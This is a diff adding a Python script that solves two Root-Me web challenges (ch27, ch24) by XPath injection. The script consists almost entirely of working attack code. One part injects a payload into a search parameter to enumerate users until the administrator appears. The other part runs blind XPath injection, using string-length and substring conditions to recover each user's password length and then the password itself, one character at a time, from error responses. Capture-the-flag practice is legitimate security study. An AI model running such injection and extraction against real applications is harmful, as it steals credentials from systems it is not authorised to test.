@@ -1,0 +1,73 @@
+import requests
+import string
+url = 'http://challenge01.root-me.org/web-serveur/ch27/?action=members'
+import re
+
+def root_me_ch27(payload):
+	list=[]
+	for testchar in string.printable:
+		Base = '&search='+ testchar+payload#"')]|//*|users[contians(.,'"
+		response = requests.get(url+Base)
+
+	#results = response.text.split('results')[-2][-2]
+		results = re.findall("<li>(.*)</li>",response.text)
+	#print(results)
+		if len(results) >0:
+			for user in results:
+				if user not in list:
+					list.append(user)
+				#print('[+]: Found user: ', user)
+
+					if 'administrator' in user:
+						result = '[+]: Done!, Found administrator: '+user.split('<li>')[-3].split('</li>')[-2]
+						return(result)
+			
+print(root_me_ch27("')]|//*|users[contians(.,'"))
+
+url = "http://challenge01.root-me.org/web-serveur/ch24/?action=members"
+response = requests.get(url)
+chardic={}
+i=1
+for lists in response.text.split('><'):
+	if '@' in lists:
+		result = re.findall('td>(.*)</td',lists)[0]
+		print(result)
+
+		for char in result:
+			if chardic.__contains__(char) == False:
+				chardic[char]='substring(//user[userid={}]/email,{},1)'.format(i,result.index(char)+1)
+				print(char,':',chardic[char])
+		i+=1
+for char in string.digits:
+	chardic[char] = 'string({})'.format(char)
+
+print(''.join(chardic.keys()))
+
+url = 'http://challenge01.root-me.org/web-serveur/ch24/?action=user&userid='
+
+
+users =[]
+for j in range(5):
+	for length in range(5,30):
+		out = requests.get(url+"{}+and+string-length(password)={}".format((j+1),length))
+		if "XPath error" not in out.text:
+			print("userid ={} ,password length is {}".format(j+1,length))
+			users.append(length)
+			print(users[j])
+
+for j in range(5):
+	password=[]
+
+	for i in range(users[j]):
+		for char in chardic.keys():
+			payload = 'substring(password,{},1)={}'.format(i+1,chardic[char])
+			response = requests.get(url+"{}+and+".format(j+1)+payload)
+			if "XPath error" not in response.text:
+				password.append(char)							
+		if(len(password)<i+1):
+			password.append('?')	
+		print("password is ",''.join(password))
+	print("userid = {},password is: ".format(j+1),''.join(password))
+
+
+
